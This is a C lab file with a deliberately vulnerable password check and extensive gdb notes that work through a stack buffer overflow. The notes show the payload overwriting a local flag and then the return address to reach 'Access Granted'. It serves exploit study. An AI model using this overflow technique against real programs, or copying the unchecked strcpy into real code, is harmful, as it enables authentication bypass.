#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int check_authentication(char *password) {
  // reversing the order of the declaration will not override the return type
  //int auth_flag = 0;
  char password_buffer[16];

  strcpy(password_buffer, password);

  if (strcmp(password_buffer, "brillig") == 0)
    //auth_flag = 1;
    return 1;
  if (strcmp(password_buffer, "outgrabe") == 0)
    //auth_flag = 1;
    return 1;

  //return auth_flag;
  return 0;
}


int main(int argc, char *argv[]) {
  if (argc < 2) {
    printf("Usage: %s <password>\n", argv[0]);
    exit(0);
  }

  // considers any nonzero value to be authenticated
  if (check_authentication(argv[1])) {
    printf("\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
    printf("\tAccess Granted.\n");
    printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
  } else {
    printf("\nAccess Denied.\n");
  }
}

/*

gcc -g -m32 -fno-stack-protector -z execstack -fno-pie -no-pie -z norelro auth_overflow.c -o auth_overflow.out

./auth_overflow.out brillig
./auth_overflow.out outgrabe

# no segmentation fault (x27)
./auth_overflow.out AAAAAAAAAAAAAAAAAAAAAAAAAAA

# x30
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

gdb -q auth_overflow.out
# strcpy
(gdb) break 10
# return
(gdb) break 17

(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAA
(gdb) x/s password_buffer
0xffeca9bc:	"\bh\372\367"
(gdb) x/x &auth_flag
0xffeca9cc:	0x00
(gdb) print 0xffeca9cc - 0xffeca9bc
$1 = 16

(gdb) x/16xw password_buffer
0xffeca9bc:	0xf7fa6808	0xf7fa3000	0xf7fa3000	0x00000000
0xffeca9cc:	0x00000000	0xf7fa33fc	0x00000000	0xffeca9f8
0xffeca9dc:	0x08048571	0xffecc915	0xffecaaa4	0xffecaab0
0xffeca9ec:	0x080485f1	0xf7fc2970	0xffecaa10	0x00000000

(gdb) continue

(gdb) x/s password_buffer
0xffeca9bc:	'A' <repeats 27 times>
(gdb) x/x &auth_flag
0xffeca9cc:	0x41
(gdb) x/16xw password_buffer
0xffeca9bc:	0x41414141	0x41414141	0x41414141	0x41414141
0xffeca9cc:	0x41414141	0x41414141	0x00414141	0xffeca9f8
0xffeca9dc:	0x08048571	0xffecc915	0xffecaaa4	0xffecaab0
0xffeca9ec:	0x080485f1	0xf7fc2970	0xffecaa10	0x00000000

(gdb) x/4cb &auth_flag
0xffeca9cc:	65 'A'	65 'A'	65 'A'	65 'A'
(gdb) x/dw &auth_flag
0xffeca9cc:	1094795585

(gdb) continue 
Continuing.

-=-=-=-=-=-=-=-=-=-=-=-=-=-
	Access Granted.
-=-=-=-=-=-=-=-=-=-=-=-=-=-

##############################

* the stack is one of five memory segments used by programs
* the stack is a FILO data structure used to maintain execution flow and context for local variables during function calls
* when a function is called, a structure called a stack frame is pushed onto the stack,
  and the EIP register jumps to the first instruction of the function
* each stack frame contains the local variables for that function and a return address so EIP can be restored
* when the function is done, the stack frame is popped off the stack and the return address is used to restore EIP
* the size and structure of a stack frame can vary greatly, depending on the function and certain compiler optimizations
* the stack frame contains more than just the local variables and padding
8 if the program is compiled with the flag -fomit-frame-pointer for optimization, the frame pointer won't be used in the stack frame

# variables are added from the bottom up
--- (top of the stack)
password_buffer variable
---
auth_flag variable
---
Saved Frame Pointer (SFP)
---
Return Address (ret) used to restore EIP
---
*password (func argument)
---
main()'s stack frame
...
--- (bottom of the stack)

gdb -q auth_overflow.out

# type RETURN x2 to repeat
(gdb) list
# invoke function
(gdb) break 28
# strcpy
(gdb) break 10
# return
(gdb) break 17

(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAA

# stack pointer
(gdb) i r esp
esp 0xfffbf780 0xfffbf780

# show top of the stack
(gdb) x/32xw $esp
0xfffbf780:	0xf7f07970	0xfffbf7a0	0x00000000	0xf7d28f21
0xfffbf790:	0xf7ee8000	0xf7ee8000	0x00000000	0xf7d28f21
0xfffbf7a0:	0x00000002	0xfffbf834	0xfffbf840	0xfffbf7c4
0xfffbf7b0:	0x00000001	0x00000000	0xf7ee8000	0xf7f0771a
0xfffbf7c0:	0xf7f1f000	0x00000000	0xf7ee8000	0x00000000
0xfffbf7d0:	0x00000000	0x2c99e049	0x7e6b6659	0x00000000
0xfffbf7e0:	0x00000000	0x00000000	0x00000002	0x080483b0
0xfffbf7f0:	0x00000000	0xf7f0cde0	0xf7f07970	0x08049920

# when invoking check_authentication
# ESP is smaller as it moves up the list of memory to make room for check_authentication()'s stack frame
(gdb) c 
(gdb) i r esp
esp 0xfffbf740 0xfffbf740
(gdb) x/32xw $esp
0xfffbf740:	0x00000008  0xfffc08f2	0xf7d40589	0xf7eeb808                        ; password_buffer + some padding for local variables
0xfffbf750:	0xf7ee8000	0xf7ee8000	0x00000000	[ auth_flag = 0x00000000 ]        ; auth_flag @ 0xfffbf75c ???
0xfffbf760:	0xf7ee83fc	0x00000000	0xfffbf788	[ EIP = 0x08048571 ]              ; 0x08048571 is the return address to restore EIP
0xfffbf770:	[ argv[1] = 0xfffc0915 ]	0xfffbf834	0xfffbf840	0x080485f1          ; argument of check_authentication @ 0xfffc0915 i.e. 27xA
0xfffbf780:	0xf7f07970  0xfffbf7a0	0x00000000	0xf7d28f21                        ; 0xfffbf780 is the previous ESP value in MAIN i.e. SFP
0xfffbf790:	0xf7ee8000	0xf7ee8000	0x00000000	0xf7d28f21
0xfffbf7a0:	0x00000002	0xfffbf834	0xfffbf840	0xfffbf7c4
0xfffbf7b0:	0x00000001	0x00000000	0xf7ee8000	0xf7f0771a

# space between the 2 stack frames
(gdb) p 0xfffbf780 - 0xfffbf740
$1 = 64

(gdb) x/s password_buffer
0xfffbf74c:	"\b\270\356\367"
(gdb) x/x &auth_flag
0xfffbf75c:	0x00

??? why is this address ???

(gdb) x/32xb 0xfffc0915
0xfffc0915:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xfffc091d:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xfffc0925:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xfffc092d:	0x41	0x41	0x41	0x00	0x48	0x4f	0x53	0x54
(gdb) x/s 0xfffc0915
0xfffc0915:	'A' <repeats 27 times>

(gdb) set disassembly intel
(gdb) disassemble main
Dump of assembler code for function main:
   0x08048528 <+0>:	  lea    ecx,[esp+0x4]
   0x0804852c <+4>:	  and    esp,0xfffffff0
   0x0804852f <+7>:	  push   DWORD PTR [ecx-0x4]
   0x08048532 <+10>:	push   ebp
   0x08048533 <+11>:	mov    ebp,esp
   0x08048535 <+13>:	push   ecx
   0x08048536 <+14>:	sub    esp,0x4
   0x08048539 <+17>:	mov    eax,ecx
   0x0804853b <+19>:	cmp    DWORD PTR [eax],0x1
   0x0804853e <+22>:	jg     0x8048560 <main+56>
   0x08048540 <+24>:	mov    eax,DWORD PTR [eax+0x4]
   0x08048543 <+27>:	mov    eax,DWORD PTR [eax]
   0x08048545 <+29>:	sub    esp,0x8
   0x08048548 <+32>:	push   eax
   0x08048549 <+33>:	push   0x8048661
   0x0804854e <+38>:	call   0x8048350 <printf@plt>
   0x08048553 <+43>:	add    esp,0x10
   0x08048556 <+46>:	sub    esp,0xc
   0x08048559 <+49>:	push   0x0
   0x0804855b <+51>:	call   0x8048380 <exit@plt>
   0x08048560 <+56>:	mov    eax,DWORD PTR [eax+0x4]
   0x08048563 <+59>:	add    eax,0x4
   0x08048566 <+62>:	mov    eax,DWORD PTR [eax]
   0x08048568 <+64>:	sub    esp,0xc
   0x0804856b <+67>:	push   eax
   0x0804856c <+68>:	call   0x80484c6 <check_authentication>
   0x08048571 <+73>:	add    esp,0x10                           ; next instruction after check_authentication
   0x08048574 <+76>:	test   eax,eax
   0x08048576 <+78>:	je     0x80485aa <main+130>
   0x08048578 <+80>:	sub    esp,0xc
   0x0804857b <+83>:	push   0x8048677
   0x08048580 <+88>:	call   0x8048370 <puts@plt>
   0x08048585 <+93>:	add    esp,0x10
   0x08048588 <+96>:	sub    esp,0xc
   0x0804858b <+99>:	push   0x8048694
   0x08048590 <+104>:	call   0x8048370 <puts@plt>
   0x08048595 <+109>:	add    esp,0x10
   0x08048598 <+112>:	sub    esp,0xc
   0x0804859b <+115>:	push   0x80486a5
   0x080485a0 <+120>:	call   0x8048370 <puts@plt>
   0x080485a5 <+125>:	add    esp,0x10
   0x080485a8 <+128>:	jmp    0x80485ba <main+146>
   0x080485aa <+130>:	sub    esp,0xc
   0x080485ad <+133>:	push   0x80486c1
   0x080485b2 <+138>:	call   0x8048370 <puts@plt>
   0x080485b7 <+143>:	add    esp,0x10
   0x080485ba <+146>:	mov    eax,0x0
   0x080485bf <+151>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x080485c2 <+154>:	leave  
   0x080485c3 <+155>:	lea    esp,[ecx-0x4]
   0x080485c6 <+158>:	ret    
End of assembler dump.

(gdb) disassemble check_authentication
Dump of assembler code for function check_authentication:
   0x080484c6 <+0>:	  push   ebp                              ; function prologue: saved frame pointer (previous base pointer)
   0x080484c7 <+1>:	  mov    ebp,esp                          ; function prologue: update base pointer
   0x080484c9 <+3>:	  sub    esp,0x28                         ; function prologue: 0x28 is the space for local variables and can change based on compiler/optimization
   0x080484cc <+6>:	  mov    DWORD PTR [ebp-0xc],0x0
=> 0x080484d3 <+13>:	sub    esp,0x8
   0x080484d6 <+16>:	push   DWORD PTR [ebp+0x8]
   0x080484d9 <+19>:	lea    eax,[ebp-0x1c]
   0x080484dc <+22>:	push   eax
   0x080484dd <+23>:	call   0x8048360 <strcpy@plt>
   0x080484e2 <+28>:	add    esp,0x10
   0x080484e5 <+31>:	sub    esp,0x8
   0x080484e8 <+34>:	push   0x8048650
   0x080484ed <+39>:	lea    eax,[ebp-0x1c]
   0x080484f0 <+42>:	push   eax
   0x080484f1 <+43>:	call   0x8048340 <strcmp@plt>
   0x080484f6 <+48>:	add    esp,0x10
   0x080484f9 <+51>:	test   eax,eax
   0x080484fb <+53>:	jne    0x8048504 <check_authentication+62>
   0x080484fd <+55>:	mov    DWORD PTR [ebp-0xc],0x1
   0x08048504 <+62>:	sub    esp,0x8
   0x08048507 <+65>:	push   0x8048658
   0x0804850c <+70>:	lea    eax,[ebp-0x1c]
   0x0804850f <+73>:	push   eax
   0x08048510 <+74>:	call   0x8048340 <strcmp@plt>
   0x08048515 <+79>:	add    esp,0x10
   0x08048518 <+82>:	test   eax,eax
   0x0804851a <+84>:	jne    0x8048523 <check_authentication+93>
   0x0804851c <+86>:	mov    DWORD PTR [ebp-0xc],0x1
   0x08048523 <+93>:	mov    eax,DWORD PTR [ebp-0xc]
   0x08048526 <+96>:	leave  
   0x08048527 <+97>:	ret    
End of assembler dump.

(gdb) continue 
(gdb) x/32xw $esp
0xfffbf740:	0x00000008	0xfffc08f2	0xf7d40589	[>>> password_buffer = 0x41414141   ; password_buffer 16 char ???
0xfffbf750:	0x41414141	0x41414141	0x41414141 <<<] [ auth_flag = 0x41414141 ]
0xfffbf760:	[ ??? 0x41414141	0x00414141	0xfffbf788 ??? ]	[ EIP = 0x08048571 ]    ; ??? Saved Frame Pointer + padding ???
0xfffbf770:	0xfffc0915	0xfffbf834	0xfffbf840	0x080485f1                          ; 0xfffc0915 pointer to Ax27 what is it ???
0xfffbf780:	0xf7f07970	0xfffbf7a0	0x00000000	0xf7d28f21
0xfffbf790:	0xf7ee8000	0xf7ee8000	0x00000000	0xf7d28f21
0xfffbf7a0:	0x00000002	0xfffbf834	0xfffbf840	0xfffbf7c4
0xfffbf7b0:	0x00000001	0x00000000	0xf7ee8000	0xf7f0771a

##############################

>>> see commented auth_flag

./auth_overflow.out $(perl -e 'print "A"x23')

gdb -q auth_overflow.out

(gdb) disassemble main
...
0x08048586 <+67>:	push   eax
0x08048587 <+68>:	call   0x80484e6 <check_authentication>
0x0804858c <+73>:	add    esp,0x10                           ; default EIP value on return
0x0804858f <+76>:	test   eax,eax                            ; compare return value
0x08048591 <+78>:	je     0x80485c5 <main+130>               ; JMP to 0x080485c5
0x08048593 <+80>:	sub    esp,0xc                            ; GRANTED >>> 0x08048593
0x08048596 <+83>:	push   0x8048697
0x0804859b <+88>:	call   0x8048390 <puts@plt>
0x080485a0 <+93>:	add    esp,0x10
0x080485a3 <+96>:	sub    esp,0xc
0x080485a6 <+99>:	push   0x80486b4
0x080485ab <+104>:	call   0x8048390 <puts@plt>
0x080485b0 <+109>:	add    esp,0x10
0x080485b3 <+112>:	sub    esp,0xc
0x080485b6 <+115>:	push   0x80486c5
0x080485bb <+120>:	call   0x8048390 <puts@plt>
0x080485c0 <+125>:	add    esp,0x10
0x080485c3 <+128>:	jmp    0x80485d5 <main+146>
0x080485c5 <+130>:	sub    esp,0xc                          ; DENIED
0x080485c8 <+133>:	push   0x80486e1
0x080485cd <+138>:	call   0x8048390 <puts@plt>

# call check_authentication
(gdb) break 31
# strcpy
(gdb) break 10
# return in check_authentication
(gdb) break 20

(gdb) run $(perl -e 'print "A"x23')
(gdb) continue
(gdb) i r esp
esp 0xffffd740 0xffffd740
(gdb) x/32xw $esp
0xffffd740:	0xf7fe5970	0xffffd760	0x00000000	0xf7e06f21
0xffffd750:	0xf7fc6000	0xf7fc6000	0x00000000	0xf7e06f21
0xffffd760:	0x00000002	0xffffd7f4	0xffffd800	0xffffd784
0xffffd770:	0x00000001	0x00000000	0xf7fc6000	0xf7fe571a
0xffffd780:	0xf7ffd000	0x00000000	0xf7fc6000	0x00000000
0xffffd790:	0x00000000	0x090fa8a8	0x367caeb8	0x00000000
0xffffd7a0:	0x00000000	0x00000000	0x00000002	0x080483d0
0xffffd7b0:	0x00000000	0xf7feade0	0xf7fe5970	0x0804a000
(gdb) continue 
(gdb) i r esp
esp 0xffffd710 0xffffd710
(gdb) x/32xw $esp
0xffffd710:	0xf7fc6000	0xf7fc6000	0x00000000	0xf7e1e6eb
0xffffd720:	0xf7fc63fc	0x00000000	0xffffd748	[ EIP = 0x0804858c ]
0xffffd730:	0xffffd919	0xffffd7f4	0xffffd800	0x08048611
0xffffd740:	0xf7fe5970	0xffffd760	0x00000000	0xf7e06f21
0xffffd750:	0xf7fc6000	0xf7fc6000	0x00000000	0xf7e06f21
0xffffd760:	0x00000002	0xffffd7f4	0xffffd800	0xffffd784
0xffffd770:	0x00000001	0x00000000	0xf7fc6000	0xf7fe571a
0xffffd780:	0xf7ffd000	0x00000000	0xf7fc6000	0x00000000
(gdb) continue
(gdb) x/32xw $esp
0xffffd710:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd720:	0x41414141	0x00414141	0xffffd748	0x0804858c
0xffffd730:	0xffffd919	0xffffd7f4	0xffffd800	0x08048611
0xffffd740:	0xf7fe5970	0xffffd760	0x00000000	0xf7e06f21
0xffffd750:	0xf7fc6000	0xf7fc6000	0x00000000	0xf7e06f21
0xffffd760:	0x00000002	0xffffd7f4	0xffffd800	0xffffd784
0xffffd770:	0x00000001	0x00000000	0xf7fc6000	0xf7fe571a
0xffffd780:	0xf7ffd000	0x00000000	0xf7fc6000	0x00000000

# 23 is the max payload without segmentation fault i.e. char[] + default padding
23 + 5 + address

(gdb) break 20
(gdb) run $(perl -e 'print "A"x28 . "\xef\xbe\xad\xde"')
(gdb) x/32xw $esp
0xffffd700:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd710:	0x41414141	0x41414141	0x41414141	[ EIP = 0xdeadbeef ]
0xffffd720:	0xffffd900	0xffffd7e4	0xffffd7f0	0x08048611
0xffffd730:	0xf7fe5970	0xffffd750	0x00000000	0xf7e06f21
0xffffd740:	0xf7fc6000	0xf7fc6000	0x00000000	0xf7e06f21
0xffffd750:	0x00000002	0xffffd7e4	0xffffd7f0	0xffffd774
0xffffd760:	0x00000001	0x00000000	0xf7fc6000	0xf7fe571a
0xffffd770:	0xf7ffd000	0x00000000	0xf7fc6000	0x00000000

# 0x0804858c is the correct return address to restore in EIP
# >>> GRANTED is @ 0x08048593

# little endian 0x08|04|85|93

./auth_overflow.out $(perl -e 'print "A"x28 . "\x93\x85\x04\x08"')

-=-=-=-=-=-=-=-=-=-=-=-=-=-
	Access Granted.
-=-=-=-=-=-=-=-=-=-=-=-=-=-
Segmentation fault (core dumped)

*/
